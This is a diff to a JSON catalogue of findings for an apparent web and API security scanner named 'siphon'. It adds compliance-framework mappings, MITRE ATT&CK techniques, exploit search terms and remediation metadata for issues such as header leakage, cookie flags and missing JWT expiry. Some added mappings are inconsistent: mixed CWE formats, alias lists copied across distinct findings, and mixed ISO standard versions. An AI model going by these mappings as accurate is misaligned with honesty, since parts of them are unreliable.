@@ -787,12 +787,22 @@
     {
       "id": "SI-015",
       "title": "File Upload Endpoint Detected",
-      "aliases": [],
+      "aliases": [
+        "Interesting Endpoint Discovered",
+        "Wildcard (*) Detected",
+        "Authenticated Interesting Endpoint",
+        "Sensitive Path Accessible",
+        "Endpoint-Specific Security Header Found",
+        "File Upload Endpoint Detected"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "INFO",
-      "cwe": [],
+      "cwe": [
+        "200",
+        "284"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 0.0,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
@@ -800,23 +810,56 @@
       "qualys_qids": [],
       "owasp_web": "A04:2021 Insecure Design",
       "owasp_api": "API9:2023 Improper Inventory Management",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
+      "nist_csf2": [
+        "ID.AM-01",
+        "PR.AC-03"
+      ],
+      "nist_800_53": [
+        "CM-8",
+        "CM-7",
+        "AC-3"
+      ],
+      "nist_800_171": [
+        "3.4.6",
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "6.5.1"
+      ],
+      "iso_27001": [
+        "A.8.9"
+      ],
+      "iso_27002": [
+        "8.9"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 25"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1595.003",
+          "tactic": "Reconnaissance",
+          "name": "Active Scanning: Wordlist Scanning"
+        },
+        {
+          "technique": "T1083",
+          "tactic": "Discovery",
+          "name": "File and Directory Discovery"
+        }
+      ],
       "searchsploit_terms": [],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Enforce strict file type validation using magic bytes rather than extension or MIME type alone. Store uploaded files outside the web root in a sandboxed directory. Rename uploaded files to random identifiers. Scan uploaded files with antivirus/antimalware before storing. Implement size limits and rate limiting on upload endpoints. Require authentication for all upload functionality.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Web Application",
+      "remediation_category": "Reconnaissance Finding",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files"
@@ -899,12 +942,17 @@
     {
       "id": "SI-017",
       "title": "JWT Missing Expiry Claim",
-      "aliases": [],
+      "aliases": [
+        "JWT \u2014 Missing Expiry Claim (No exp)"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "613",
+        "287"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 4.3,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
@@ -912,23 +960,62 @@
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.AC-01",
+        "PR.AC-07"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "SC-23",
+        "AC-12"
+      ],
+      "nist_800_171": [
+        "3.5.3",
+        "3.13.8"
+      ],
+      "pci_dss_4": [
+        "8.2.4",
+        "8.3.9"
+      ],
+      "iso_27001": [
+        "A.9.4.2"
+      ],
+      "iso_27002": [
+        "9.4.2"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.2"
+      ],
+      "hitrust": [
+        "01.d",
+        "01.y"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1550.001",
+          "tactic": "Defense Evasion",
+          "name": "Use Alternate Authentication Material: Application Access Token"
+        },
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        }
+      ],
+      "searchsploit_terms": [
+        "JWT no expiry",
+        "JWT token hijacking"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Include an exp claim in all issued JWTs with an appropriate short-lived expiry (e.g., 15 minutes for access tokens, 24 hours for refresh tokens). Validate the exp claim server-side on every request. Implement token refresh logic for clients so that short-lived access tokens can be renewed using longer-lived refresh tokens. Never issue non-expiring tokens in production.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Authentication",
+      "remediation_category": "JWT Security",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.4",
         "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
@@ -957,36 +1044,82 @@
     {
       "id": "SI-018",
       "title": "Header Data Leakage: Server",
-      "aliases": [],
+      "aliases": [
+        "Software Version Detected",
+        "Service Banner",
+        "Header Data Leakage: Server",
+        "Header Data Leakage: X-AspNet-Version",
+        "Header Data Leakage: X-Powered-By",
+        "OS Version Detected",
+        "Web Server Version Disclosure",
+        "Header Data Leakage: Via"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "CWE-200"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 3.7,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10107,
+        40984
+      ],
+      "qualys_qids": [
+        86001,
+        86002
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "CM-7",
+        "SI-12"
+      ],
+      "nist_800_171": [
+        "3.4.6"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1592.002",
+          "tactic": "Reconnaissance",
+          "name": "Gather Victim Host Information: Software"
+        }
+      ],
+      "searchsploit_terms": [
+        "banner grabbing",
+        "version disclosure"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/http_version"
+      ],
       "kev": false,
       "remediation_brief": "Configure the web server to suppress or mask the Server header. In nginx, set 'server_tokens off'. In Apache, set 'ServerTokens Prod' and 'ServerSignature Off'. Configure IIS to remove the Server header via HTTP response headers settings. Replace the header value with a generic string if complete removal is not possible.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/02-Fingerprint_Web_Server",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
@@ -1013,36 +1146,82 @@
     {
       "id": "SI-019",
       "title": "Header Data Leakage: Via",
-      "aliases": [],
+      "aliases": [
+        "Software Version Detected",
+        "Service Banner",
+        "Header Data Leakage: Server",
+        "Header Data Leakage: X-AspNet-Version",
+        "Header Data Leakage: X-Powered-By",
+        "OS Version Detected",
+        "Web Server Version Disclosure",
+        "Header Data Leakage: Via"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "CWE-200"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 3.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10107,
+        40984
+      ],
+      "qualys_qids": [
+        86001,
+        86002
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "CM-7",
+        "SI-12"
+      ],
+      "nist_800_171": [
+        "3.4.6"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1592.002",
+          "tactic": "Reconnaissance",
+          "name": "Gather Victim Host Information: Software"
+        }
+      ],
+      "searchsploit_terms": [
+        "banner grabbing",
+        "version disclosure"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/http_version"
+      ],
       "kev": false,
       "remediation_brief": "Configure reverse proxies and CDN edge nodes to suppress or rewrite the Via header before forwarding responses to clients. If Via is required for debugging purposes, ensure it only contains generic identifiers rather than internal hostnames or software versions. Use network segmentation to prevent direct access to origin servers bypassing the CDN.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
@@ -1069,36 +1248,82 @@
     {
       "id": "SI-020",
       "title": "Header Data Leakage: X-Powered-By",
-      "aliases": [],
+      "aliases": [
+        "Software Version Detected",
+        "Service Banner",
+        "Header Data Leakage: Server",
+        "Header Data Leakage: X-AspNet-Version",
+        "Header Data Leakage: X-Powered-By",
+        "OS Version Detected",
+        "Web Server Version Disclosure",
+        "Header Data Leakage: Via"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "CWE-200"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 3.7,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10107,
+        40984
+      ],
+      "qualys_qids": [
+        86001,
+        86002
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "CM-7",
+        "SI-12"
+      ],
+      "nist_800_171": [
+        "3.4.6"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1592.002",
+          "tactic": "Reconnaissance",
+          "name": "Gather Victim Host Information: Software"
+        }
+      ],
+      "searchsploit_terms": [
+        "banner grabbing",
+        "version disclosure"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/http_version"
+      ],
       "kev": false,
       "remediation_brief": "Remove the X-Powered-By header at the framework or server level. In Express.js, call 'app.disable(\"x-powered-by\")'. In PHP, set 'expose_php = Off' in php.ini. In ASP.NET, remove the X-Powered-By header in the web.config customHeaders section. Alternatively, strip the header at the reverse proxy or WAF layer.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/09-Fingerprint_Web_Application",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
@@ -1125,36 +1350,82 @@
     {
       "id": "SI-021",
       "title": "Header Data Leakage: X-AspNet-Version",
-      "aliases": [],
+      "aliases": [
+        "Software Version Detected",
+        "Service Banner",
+        "Header Data Leakage: Server",
+        "Header Data Leakage: X-AspNet-Version",
+        "Header Data Leakage: X-Powered-By",
+        "OS Version Detected",
+        "Web Server Version Disclosure",
+        "Header Data Leakage: Via"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "CWE-200"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 3.7,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10107,
+        40984
+      ],
+      "qualys_qids": [
+        86001,
+        86002
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "CM-7",
+        "SI-12"
+      ],
+      "nist_800_171": [
+        "3.4.6"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1592.002",
+          "tactic": "Reconnaissance",
+          "name": "Gather Victim Host Information: Software"
+        }
+      ],
+      "searchsploit_terms": [
+        "banner grabbing",
+        "version disclosure"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/http_version"
+      ],
       "kev": false,
       "remediation_brief": "Disable the X-AspNet-Version header by adding '<httpRuntime enableVersionHeader=\"false\" />' to the system.web section of web.config. Additionally configure IIS to remove the X-Powered-By and Server headers via customHeaders configuration. Keep ASP.NET runtime patched to the latest stable version regardless of header suppression.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/09-Fingerprint_Web_Application",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
@@ -1523,36 +1794,89 @@
     {
       "id": "SI-028",
       "title": "Missing Secure Cookie Attribute: SameSite",
-      "aliases": [],
+      "aliases": [
+        "Missing Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: HttpOnly",
+        "Misconfigured Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: Secure"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "614",
+        "1004",
+        "1275"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 4.3,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        84502
+      ],
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "SC-8",
+        "IA-5",
+        "SC-23"
+      ],
+      "nist_800_171": [
+        "3.13.8",
+        "3.5.10"
+      ],
+      "pci_dss_4": [
+        "6.4.1",
+        "6.5.10"
+      ],
+      "iso_27001": [
+        "A.8.24",
+        "A.8.1"
+      ],
+      "iso_27002": [
+        "8.24",
+        "8.9"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.7"
+      ],
+      "hitrust": [
+        "09.ab",
+        "09.ac"
+      ],
+      "gdpr": [
+        "Article 25",
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        },
+        {
+          "technique": "T1185",
+          "tactic": "Collection",
+          "name": "Browser Session Hijacking"
+        }
+      ],
+      "searchsploit_terms": [
+        "cookie hijacking",
+        "session cookie theft"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Set the SameSite attribute to 'Lax' as a minimum, or 'Strict' for sensitive cookies such as session tokens. 'None' should only be used when cross-site cookie sending is explicitly required, and must be paired with the Secure attribute. Evaluate whether cookie-based authentication is appropriate for the API, or whether Authorization headers should be used instead.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Web Application",
+      "remediation_category": "Cookie Security",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
         "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
@@ -1580,36 +1904,89 @@
     {
       "id": "SI-029",
       "title": "Misconfigured Secure Cookie Attribute: SameSite",
-      "aliases": [],
+      "aliases": [
+        "Missing Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: HttpOnly",
+        "Misconfigured Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: Secure"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "614",
+        "1004",
+        "1275"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 4.3,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        84502
+      ],
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "SC-8",
+        "IA-5",
+        "SC-23"
+      ],
+      "nist_800_171": [
+        "3.13.8",
+        "3.5.10"
+      ],
+      "pci_dss_4": [
+        "6.4.1",
+        "6.5.10"
+      ],
+      "iso_27001": [
+        "A.8.24",
+        "A.8.1"
+      ],
+      "iso_27002": [
+        "8.24",
+        "8.9"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.7"
+      ],
+      "hitrust": [
+        "09.ab",
+        "09.ac"
+      ],
+      "gdpr": [
+        "Article 25",
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        },
+        {
+          "technique": "T1185",
+          "tactic": "Collection",
+          "name": "Browser Session Hijacking"
+        }
+      ],
+      "searchsploit_terms": [
+        "cookie hijacking",
+        "session cookie theft"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Audit all cookies with SameSite=None and confirm each has a documented business requirement for cross-site access. Ensure SameSite=None is always paired with the Secure attribute. Where cross-site access is not required, change SameSite to 'Lax' or 'Strict'. Remove any unrecognized or typo'd SameSite values.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Web Application",
+      "remediation_category": "Cookie Security",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
         "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
@@ -2032,36 +2409,89 @@
     {
       "id": "SI-037",
       "title": "Missing Secure Cookie Attribute: HttpOnly",
-      "aliases": [],
+      "aliases": [
+        "Missing Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: HttpOnly",
+        "Misconfigured Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: Secure"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "MEDIUM",
-      "cwe": [],
+      "cwe": [
+        "614",
+        "1004",
+        "1275"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 5.4,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        84502
+      ],
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "SC-8",
+        "IA-5",
+        "SC-23"
+      ],
+      "nist_800_171": [
+        "3.13.8",
+        "3.5.10"
+      ],
+      "pci_dss_4": [
+        "6.4.1",
+        "6.5.10"
+      ],
+      "iso_27001": [
+        "A.8.24",
+        "A.8.1"
+      ],
+      "iso_27002": [
+        "8.24",
+        "8.9"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.7"
+      ],
+      "hitrust": [
+        "09.ab",
+        "09.ac"
+      ],
+      "gdpr": [
+        "Article 25",
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        },
+        {
+          "technique": "T1185",
+          "tactic": "Collection",
+          "name": "Browser Session Hijacking"
+        }
+      ],
+      "searchsploit_terms": [
+        "cookie hijacking",
+        "session cookie theft"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Set the HttpOnly flag on all session and authentication cookies. This prevents JavaScript from accessing the cookie value while still allowing it to be sent on HTTP requests. Evaluate whether cookie-based authentication is appropriate for the API use case; Authorization headers are generally preferred for API clients as they cannot be stolen via XSS in the same way.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Web Application",
+      "remediation_category": "Cookie Security",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
         "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
@@ -2089,36 +2519,89 @@
     {
       "id": "SI-038",
       "title": "Missing Secure Cookie Attribute: Secure",
-      "aliases": [],
+      "aliases": [
+        "Missing Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: HttpOnly",
+        "Misconfigured Secure Cookie Attribute: SameSite",
+        "Missing Secure Cookie Attribute: Secure"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "MEDIUM",
-      "cwe": [],
+      "cwe": [
+        "614",
+        "1004",
+        "1275"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 5.9,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        84502
+      ],
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "SC-8",
+        "IA-5",
+        "SC-23"
+      ],
+      "nist_800_171": [
+        "3.13.8",
+        "3.5.10"
+      ],
+      "pci_dss_4": [
+        "6.4.1",
+        "6.5.10"
+      ],
+      "iso_27001": [
+        "A.8.24",
+        "A.8.1"
+      ],
+      "iso_27002": [
+        "8.24",
+        "8.9"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.7"
+      ],
+      "hitrust": [
+        "09.ab",
+        "09.ac"
+      ],
+      "gdpr": [
+        "Article 25",
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        },
+        {
+          "technique": "T1185",
+          "tactic": "Collection",
+          "name": "Browser Session Hijacking"
+        }
+      ],
+      "searchsploit_terms": [
+        "cookie hijacking",
+        "session cookie theft"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Set the Secure flag on all session and authentication cookies. This ensures the cookie is only transmitted over HTTPS connections. Combine with HSTS to prevent the browser from making HTTP requests to the API at all. If HTTP access is still required for any reason, ensure no sensitive cookies are set on HTTP responses.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Web Application",
+      "remediation_category": "Cookie Security",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
         "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
@@ -3678,12 +4161,19 @@
     {
       "id": "SI-066",
       "title": "Missing Rate Limiting",
-      "aliases": [],
+      "aliases": [
+        "No Rate Limiting on API",
+        "Missing Rate Limit on Sensitive Endpoint",
+        "Missing Rate Limiting",
+        "Unrestricted API Calls"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
+      "cwe": [
+        "CWE-770"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
@@ -3691,23 +4181,43 @@
       "qualys_qids": [],
       "owasp_web": "",
       "owasp_api": "API4:2023 Unrestricted Resource Consumption",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SC-5",
+        "CM-6"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
       "gdpr": [],
-      "mitre_attack": [],
+      "mitre_attack": [
+        {
+          "technique": "T1499",
+          "tactic": "Impact",
+          "name": "Endpoint Denial of Service"
+        }
+      ],
       "searchsploit_terms": [],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Implement rate limiting on all API endpoints, with stricter limits on authentication-related endpoints. Define rate limit policies based on IP address, API key, and authenticated user. Return 429 Too Many Requests with a Retry-After header when limits are exceeded. Use a rate limiting middleware or API gateway feature rather than application-level implementation. Implement exponential backoff enforcement for repeated authentication failures.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Architecture",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
         "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html",
@@ -3847,7 +4357,15 @@
     {
       "id": "SI-069",
       "title": "Mass Assignment Vulnerability",
-      "aliases": [],
+      "aliases": [
+        "Over-Posted Parameters",
+        "Mass Assignment \u2014 Accepted",
+        "Hidden Field Tampering",
+        "Auto-Binding Vulnerability",
+        "Mass Assignment",
+        "Mass Assignment / Privilege Escalation via Parameter Binding",
+        "Parameter Binding Attack"
+      ],
       "source_tools": [
         "siphon"
       ],
